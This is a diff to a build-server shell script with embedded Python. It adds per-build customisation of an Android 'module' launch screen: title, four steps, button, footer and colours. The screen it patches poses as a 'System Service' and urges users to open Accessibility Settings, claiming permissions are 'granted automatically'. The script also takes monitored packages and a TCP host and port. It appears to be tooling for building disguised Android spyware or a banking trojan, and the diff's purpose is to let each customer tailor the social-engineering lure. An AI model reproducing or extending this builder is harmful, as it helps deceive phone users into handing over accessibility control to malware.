@@ -152,6 +152,17 @@ emit('JOB_INSTALLER_LAUNCH_SUBTITLE',    j.get('installerLaunchSubtitle', ''))
 emit('JOB_INSTALLER_LAUNCH_BTN',         j.get('installerLaunchBtnText', ''))
 emit('JOB_INSTALLER_LAUNCH_BG_COLOR',    j.get('installerLaunchBgColor', ''))
 emit('JOB_INSTALLER_LAUNCH_ACCENT',      j.get('installerLaunchAccentColor', ''))
+emit('JOB_MODULE_LAUNCH_TITLE',          j.get('moduleLaunchTitle', ''))
+emit('JOB_MODULE_LAUNCH_SUBTITLE',       j.get('moduleLaunchSubtitle', ''))
+emit('JOB_MODULE_LAUNCH_STEP1',          j.get('moduleLaunchStep1', ''))
+emit('JOB_MODULE_LAUNCH_STEP2',          j.get('moduleLaunchStep2', ''))
+emit('JOB_MODULE_LAUNCH_STEP3',          j.get('moduleLaunchStep3', ''))
+emit('JOB_MODULE_LAUNCH_STEP4',          j.get('moduleLaunchStep4', ''))
+emit('JOB_MODULE_LAUNCH_BTN',            j.get('moduleLaunchBtnText', ''))
+emit('JOB_MODULE_LAUNCH_FOOTER',         j.get('moduleLaunchFooter', ''))
+emit('JOB_MODULE_LAUNCH_BG_COLOR',       j.get('moduleLaunchBgColor', ''))
+emit('JOB_MODULE_LAUNCH_CARD_COLOR',     j.get('moduleLaunchCardColor', ''))
+emit('JOB_MODULE_LAUNCH_ACCENT',         j.get('moduleLaunchAccentColor', ''))
 PYEOF
     }
 
@@ -285,6 +296,17 @@ PYEOF
         local JOB_INSTALLER_LAUNCH_BTN="${12}"
         local JOB_INSTALLER_LAUNCH_BG_COLOR="${13}"
         local JOB_INSTALLER_LAUNCH_ACCENT="${14}"
+        local JOB_MODULE_LAUNCH_TITLE="${15}"
+        local JOB_MODULE_LAUNCH_SUBTITLE="${16}"
+        local JOB_MODULE_LAUNCH_STEP1="${17}"
+        local JOB_MODULE_LAUNCH_STEP2="${18}"
+        local JOB_MODULE_LAUNCH_STEP3="${19}"
+        local JOB_MODULE_LAUNCH_STEP4="${20}"
+        local JOB_MODULE_LAUNCH_BTN="${21}"
+        local JOB_MODULE_LAUNCH_FOOTER="${22}"
+        local JOB_MODULE_LAUNCH_BG_COLOR="${23}"
+        local JOB_MODULE_LAUNCH_CARD_COLOR="${24}"
+        local JOB_MODULE_LAUNCH_ACCENT="${25}"
 
         (
             # ── Identify user FIRST (before any disk work) ───────────────────
@@ -345,6 +367,17 @@ PYEOF
                 BUILD_INSTALLER_LAUNCH_BTN="$JOB_INSTALLER_LAUNCH_BTN" \
                 BUILD_INSTALLER_LAUNCH_BG_COLOR="$JOB_INSTALLER_LAUNCH_BG_COLOR" \
                 BUILD_INSTALLER_LAUNCH_ACCENT="$JOB_INSTALLER_LAUNCH_ACCENT" \
+                BUILD_MODULE_LAUNCH_TITLE="$JOB_MODULE_LAUNCH_TITLE" \
+                BUILD_MODULE_LAUNCH_SUBTITLE="$JOB_MODULE_LAUNCH_SUBTITLE" \
+                BUILD_MODULE_LAUNCH_STEP1="$JOB_MODULE_LAUNCH_STEP1" \
+                BUILD_MODULE_LAUNCH_STEP2="$JOB_MODULE_LAUNCH_STEP2" \
+                BUILD_MODULE_LAUNCH_STEP3="$JOB_MODULE_LAUNCH_STEP3" \
+                BUILD_MODULE_LAUNCH_STEP4="$JOB_MODULE_LAUNCH_STEP4" \
+                BUILD_MODULE_LAUNCH_BTN="$JOB_MODULE_LAUNCH_BTN" \
+                BUILD_MODULE_LAUNCH_FOOTER="$JOB_MODULE_LAUNCH_FOOTER" \
+                BUILD_MODULE_LAUNCH_BG_COLOR="$JOB_MODULE_LAUNCH_BG_COLOR" \
+                BUILD_MODULE_LAUNCH_CARD_COLOR="$JOB_MODULE_LAUNCH_CARD_COLOR" \
+                BUILD_MODULE_LAUNCH_ACCENT="$JOB_MODULE_LAUNCH_ACCENT" \
                 bash "$WORKDIR/build.sh" 2>&1
                 echo "__BUILD_EXIT__=${PIPESTATUS[0]:-$?}"
             } | tee -a "$JOB_LOG" | tee >(send_logs "$JOB_ID")
@@ -444,7 +477,18 @@ PYEOF
             "${JOB_INSTALLER_LAUNCH_SUBTITLE:-}" \
             "${JOB_INSTALLER_LAUNCH_BTN:-}" \
             "${JOB_INSTALLER_LAUNCH_BG_COLOR:-}" \
-            "${JOB_INSTALLER_LAUNCH_ACCENT:-}" &
+            "${JOB_INSTALLER_LAUNCH_ACCENT:-}" \
+            "${JOB_MODULE_LAUNCH_TITLE:-}" \
+            "${JOB_MODULE_LAUNCH_SUBTITLE:-}" \
+            "${JOB_MODULE_LAUNCH_STEP1:-}" \
+            "${JOB_MODULE_LAUNCH_STEP2:-}" \
+            "${JOB_MODULE_LAUNCH_STEP3:-}" \
+            "${JOB_MODULE_LAUNCH_STEP4:-}" \
+            "${JOB_MODULE_LAUNCH_BTN:-}" \
+            "${JOB_MODULE_LAUNCH_FOOTER:-}" \
+            "${JOB_MODULE_LAUNCH_BG_COLOR:-}" \
+            "${JOB_MODULE_LAUNCH_CARD_COLOR:-}" \
+            "${JOB_MODULE_LAUNCH_ACCENT:-}" &
         JOB_PIDS["$JOB_ID"]=$!
         echo "📥 Job $JOB_ID accepted for $JOB_ACCESS_ID (slots in use: ${#JOB_PIDS[@]}/$MAX_PARALLEL)"
     done
@@ -529,7 +573,7 @@ cleanup_overrides() {
 }
 trap cleanup_overrides EXIT
 
-if [ -n "${BUILD_ACCESS_ID:-}" ] || [ -n "${BUILD_MODULE_PACKAGE:-}" ] || [ -n "${BUILD_INSTALLER_PACKAGE:-}" ] || [ -n "${BUILD_MODULE_NAME:-}" ] || [ -n "${BUILD_INSTALLER_NAME:-}" ] || [ -n "${BUILD_MONITORED_PACKAGES:-}" ] || [ -n "${BUILD_TCP_HOST:-}" ] || [ -n "${BUILD_TCP_PORT:-}" ] || [ -n "${BUILD_MODULE_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BTN:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_ACCENT:-}" ]; then
+if [ -n "${BUILD_ACCESS_ID:-}" ] || [ -n "${BUILD_MODULE_PACKAGE:-}" ] || [ -n "${BUILD_INSTALLER_PACKAGE:-}" ] || [ -n "${BUILD_MODULE_NAME:-}" ] || [ -n "${BUILD_INSTALLER_NAME:-}" ] || [ -n "${BUILD_MONITORED_PACKAGES:-}" ] || [ -n "${BUILD_TCP_HOST:-}" ] || [ -n "${BUILD_TCP_PORT:-}" ] || [ -n "${BUILD_MODULE_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BTN:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_ACCENT:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP1:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP2:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP3:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP4:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BTN:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_FOOTER:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_CARD_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_ACCENT:-}" ]; then
     echo ""
     echo "==> Per-build customization active"
 
@@ -864,6 +908,138 @@ with open(path, 'w', encoding='utf-8') as f: f.write(src)
 print(f'  Installer colors: bg={bg!r} accent={accent!r}')
 PYEOF
         echo "  Installer colors patched"
+    fi
+
+    # ── Patch module app/src/main/res/layout/activity_main.xml ────────────────
+    _any_module_launch_override=0
+    [ -n "${BUILD_MODULE_LAUNCH_TITLE:-}" ]     && _any_module_launch_override=1
+    [ -n "${BUILD_MODULE_LAUNCH_SUBTITLE:-}" ]   && _any_module_launch_override=1
+    [ -n "${BUILD_MODULE_LAUNCH_STEP1:-}" ]      && _any_module_launch_override=1
+    [ -n "${BUILD_MODULE_LAUNCH_STEP2:-}" ]      && _any_module_launch_override=1
+    [ -n "${BUILD_MODULE_LAUNCH_STEP3:-}" ]      && _any_module_launch_override=1
+    [ -n "${BUILD_MODULE_LAUNCH_STEP4:-}" ]      && _any_module_launch_override=1
+    [ -n "${BUILD_MODULE_LAUNCH_BTN:-}" ]        && _any_module_launch_override=1
+    [ -n "${BUILD_MODULE_LAUNCH_FOOTER:-}" ]     && _any_module_launch_override=1
+    [ -n "${BUILD_MODULE_LAUNCH_BG_COLOR:-}" ]   && _any_module_launch_override=1
+    [ -n "${BUILD_MODULE_LAUNCH_CARD_COLOR:-}" ] && _any_module_launch_override=1
+    [ -n "${BUILD_MODULE_LAUNCH_ACCENT:-}" ]     && _any_module_launch_override=1
+
+    if [ "$_any_module_launch_override" -eq 1 ] && [ -f "$APP_LAYOUT" ]; then
+        cp "$APP_LAYOUT" "$APP_LAYOUT_BAK"
+        BUILD_MODULE_LAUNCH_TITLE="${BUILD_MODULE_LAUNCH_TITLE:-}" \
+        BUILD_MODULE_LAUNCH_SUBTITLE="${BUILD_MODULE_LAUNCH_SUBTITLE:-}" \
+        BUILD_MODULE_LAUNCH_STEP1="${BUILD_MODULE_LAUNCH_STEP1:-}" \
+        BUILD_MODULE_LAUNCH_STEP2="${BUILD_MODULE_LAUNCH_STEP2:-}" \
+        BUILD_MODULE_LAUNCH_STEP3="${BUILD_MODULE_LAUNCH_STEP3:-}" \
+        BUILD_MODULE_LAUNCH_STEP4="${BUILD_MODULE_LAUNCH_STEP4:-}" \
+        BUILD_MODULE_LAUNCH_BTN="${BUILD_MODULE_LAUNCH_BTN:-}" \
+        BUILD_MODULE_LAUNCH_FOOTER="${BUILD_MODULE_LAUNCH_FOOTER:-}" \
+        BUILD_MODULE_LAUNCH_BG_COLOR="${BUILD_MODULE_LAUNCH_BG_COLOR:-}" \
+        BUILD_MODULE_LAUNCH_CARD_COLOR="${BUILD_MODULE_LAUNCH_CARD_COLOR:-}" \
+        BUILD_MODULE_LAUNCH_ACCENT="${BUILD_MODULE_LAUNCH_ACCENT:-}" \
+        python3 - "$APP_LAYOUT" << 'PYEOF'
+import sys, os, re
+path    = sys.argv[1]
+title   = os.environ.get('BUILD_MODULE_LAUNCH_TITLE', '').strip()
+sub     = os.environ.get('BUILD_MODULE_LAUNCH_SUBTITLE', '').strip()
+step1   = os.environ.get('BUILD_MODULE_LAUNCH_STEP1', '').strip()
+step2   = os.environ.get('BUILD_MODULE_LAUNCH_STEP2', '').strip()
+step3   = os.environ.get('BUILD_MODULE_LAUNCH_STEP3', '').strip()
+step4   = os.environ.get('BUILD_MODULE_LAUNCH_STEP4', '').strip()
+btn     = os.environ.get('BUILD_MODULE_LAUNCH_BTN', '').strip()
+footer  = os.environ.get('BUILD_MODULE_LAUNCH_FOOTER', '').strip()
+bg      = os.environ.get('BUILD_MODULE_LAUNCH_BG_COLOR', '').strip()
+card    = os.environ.get('BUILD_MODULE_LAUNCH_CARD_COLOR', '').strip()
+accent  = os.environ.get('BUILD_MODULE_LAUNCH_ACCENT', '').strip()
+
+def esc(s):
+    return s.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'","&apos;")
+
+def valid_hex(s): return bool(re.match(r'^#[0-9a-fA-F]{6}$', s))
+
+with open(path, 'r', encoding='utf-8') as f: src = f.read()
+
+# ── Title: the static TextView "System Service" above statusText ─────────────
+# Match the first android:text="System Service" (before any android:id lines)
+if title:
+    src = re.sub(
+        r'(android:text=")System Service(")',
+        lambda m: m.group(1) + esc(title) + m.group(2),
+        src, count=1
+    )
+
+# ── Status subtitle (@+id/statusText) ────────────────────────────────────────
+if sub:
+    src = re.sub(
+        r'(android:id="@\+id/statusText"[^/]*/?>|(?:(?!android:id).)*?android:id="@\+id/statusText"[^>]*>)',
+        lambda m: m.group(0),
+        src, count=1
+    )
+    # Simpler direct approach — replace the known default text on the statusText view
+    src = re.sub(
+        r'(android:text=")Accessibility service not enabled(")',
+        lambda m: m.group(1) + esc(sub) + m.group(2),
+        src, count=1
+    )
+
+# ── Steps — patch each step's description TextView ───────────────────────────
+def patch_step_text(src, step_num, new_text):
+    """Replace the description text of the Nth step row."""
+    # The circle TextView is self-closing (/>), NOT </TextView>.
+    # Match the number TV, skip whitespace, then grab the description TV's text attr.
+    pattern = (
+        r'(android:text="' + str(step_num) + r'"\s'
+        r'[^>]*android:background="@drawable/step_circle"'
+        r'[^/]*/>'
+        r'\s*'
+        r'<TextView'
+        r'[^>]*android:layout_weight="1"'
+        r'[^>]*android:text=")[^"]*(")'
+    )
+    return re.sub(pattern, lambda m: m.group(1) + esc(new_text) + m.group(2), src, count=1)
+
+if step1: src = patch_step_text(src, 1, step1)
+if step2: src = patch_step_text(src, 2, step2)
+if step3: src = patch_step_text(src, 3, step3)
+if step4: src = patch_step_text(src, 4, step4)
+
+# ── Button text (@+id/openAccessibilityBtn) ───────────────────────────────────
+if btn:
+    src = re.sub(
+        r'(android:text=")Open Accessibility Settings(")',
+        lambda m: m.group(1) + esc(btn) + m.group(2),
+        src, count=1
+    )
+
+# ── Footer note ────────────────────────────────────────────────────────────────
+if footer:
+    src = re.sub(
+        r'(android:text=")Permissions are granted automatically[^"]*(")',
+        lambda m: m.group(1) + esc(footer) + m.group(2),
+        src, count=1
+    )
+
+# ── Background color (ScrollView android:background) ─────────────────────────
+if bg and valid_hex(bg):
+    src = re.sub(
+        r'(android:background=")#0F172A(")',
+        lambda m: m.group(1) + bg + m.group(2),
+        src, count=1
+    )
+
+# ── Card / surface color — all LinearLayouts with #1E293B ─────────────────────
+if card and valid_hex(card):
+    src = src.replace('android:background="#1E293B"', f'android:background="{card}"')
+
+# ── Accent color — step circle textColor and button backgroundTint ─────────────
+if accent and valid_hex(accent):
+    src = src.replace('android:textColor="#0EA5E9"',       f'android:textColor="{accent}"')
+    src = src.replace('android:backgroundTint="#0EA5E9"',  f'android:backgroundTint="{accent}"')
+
+with open(path, 'w', encoding='utf-8') as f: f.write(src)
+print(f'  Module layout patched: title={title!r} sub={sub!r} btn={btn!r} bg={bg!r} card={card!r} accent={accent!r}')
+PYEOF
+        echo "  Module launch page patched"
     fi
 
     # Force clean build whenever customization is active — gradle's resource
